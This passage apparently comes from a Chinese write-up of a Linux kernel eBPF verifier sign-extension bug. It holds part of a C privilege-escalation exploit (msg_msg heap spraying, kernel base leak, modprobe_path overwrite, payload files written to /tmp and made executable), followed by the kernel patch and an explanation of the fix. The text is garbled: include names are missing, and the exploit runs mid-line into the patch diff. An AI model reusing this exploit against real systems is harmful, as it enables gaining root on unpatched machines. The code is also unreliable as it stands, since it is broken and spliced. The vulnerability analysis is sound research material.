    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include "bpf.h"
    char buffer[64];
    int sockets[2];
    int ctrl_mapfd;
    int vuln_mapfd;
    size_t ctrlmap_ptr;
    size_t vulnmap_ptr;
    size_t leakbuf[0x100];
    size_t ctrlbuf[0x100];
    size_t kbase;
    size_t pivot_esp;
    size_t modprobe_path;
    unsigned long long user_cs, user_ss, user_rflags;
    unsigned long user_stack = 0;
    struct message
    {
      long type;
      char text[0x800];
    } msg;
    void msg_alloc(int id, int size)
    {
      if (msgsnd(id, (void *)&msg, size - 0x30, IPC_NOWAIT)  /tmp/a");
      system("chmod +x /tmp/a");
      system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/ll");
      system("chmod +x /tmp/ll");
      int progfd = load_prog();
      printf("load prog finished \n");
      if (progfd dst_reg].type = SCALAR_VALUE;
    -            __mark_reg_known(regs + insn->dst_reg, insn->imm);
    +            if (BPF_CLASS(insn->code) == BPF_ALU64) {
    +                __mark_reg_known(regs + insn->dst_reg,
    +                         insn->imm);
    +            } else {
    +                __mark_reg_known(regs + insn->dst_reg,
    +                         (u32)insn->imm);
    +            }
             }
         } else if (opcode > BPF_END) {
__mark_reg_known函数的参数为u64，那么32位的有符号数进入到__mark_reg_known函数之前首先被转换为了u32也就是无符号函数，因此这里就不存在符号扩展的问题了。
__mark_reg_known函数的commit部分没有找到，
    static void __mark_reg_known(struct bpf_reg_state *reg, u64 imm)
    {
        /* Clear id, off, and union(map_ptr, range) */
        memset(((u8 *)reg) + sizeof(reg->type), 0,
               offsetof(struct bpf_reg_state, var_off) - sizeof(reg->type));
        reg->var_off = tnum_const(imm);
        reg->smin_value = (s64)imm;
        reg->smax_value = (s64)imm;
        reg->umin_value = imm;
        reg->umax_value = imm;
    }